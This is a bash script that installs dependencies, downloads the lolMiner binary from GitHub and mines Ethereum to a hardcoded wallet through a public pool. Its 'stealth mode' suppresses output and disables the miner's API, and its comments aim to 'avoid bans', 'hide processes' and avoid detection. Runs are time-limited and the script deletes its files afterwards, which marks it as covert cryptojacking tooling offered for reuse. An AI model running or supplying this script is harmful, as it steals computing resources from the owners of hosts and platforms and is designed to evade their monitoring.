#!/bin/bash

# ===== CONFIG =====
WALLET="RQAJNrnHHrUKWnfm3axM4CFtnFdhtBPo6b"  # REPLACE WITH YOUR WALLET
POOL="eth.2miners.com:2020"       # Use a common pool
WORKER="terminal-miner"           # Worker name (keep it generic)
MAX_RUNTIME_MIN=30                # Stop after X minutes (avoid bans)
STEALTH_MODE=true                 # Reduces logs and hides processes
# ==================

# --- Cleanup function ---
cleanup() {
    echo "[!] Cleaning up..."
    pkill -f lolMiner
    rm -rf lolMiner*
}

# --- Trap CTRL+C to stop mining ---
trap cleanup EXIT

# --- Install dependencies ---
echo "[+] Installing dependencies..."
sudo apt update > /dev/null 2>&1
sudo apt install -y wget tar nvidia-cuda-toolkit > /dev/null 2>&1

# --- Download lolMiner ---
echo "[+] Downloading miner..."
wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.52/lolMiner_v1.52_Lin64.tar.gz
tar -xzf lolMiner_v1.52_Lin64.tar.gz --strip-components=1

# --- Start Mining (Stealth Mode) ---
echo "[+] Starting miner (stealth mode)..."
if [ "$STEALTH_MODE" = true ]; then
    ./lolMiner \
        --algo ETHASH \
        --pool $POOL \
        --user $WALLET.$WORKER \
        --tls on \
        --apiport 0 \
        --devices all \
        --mode quiet \
        --nocolor \
        --timeprint N \
        --longstats 99999999 \
        > /dev/null 2>&1 &
else
    ./lolMiner \
        --algo ETHASH \
        --pool $POOL \
        --user $WALLET.$WORKER \
        --tls on \
        --devices all \
        --mode quiet \
        --watchdog exit \
        --longstats 60 &
fi

# --- Auto-stop after MAX_RUNTIME_MIN ---
echo "[⏳] Mining started. Will auto-stop after $MAX_RUNTIME_MIN minutes..."
sleep $(($MAX_RUNTIME_MIN * 60))
cleanup
echo "[✅] Mining stopped (avoiding detection)."
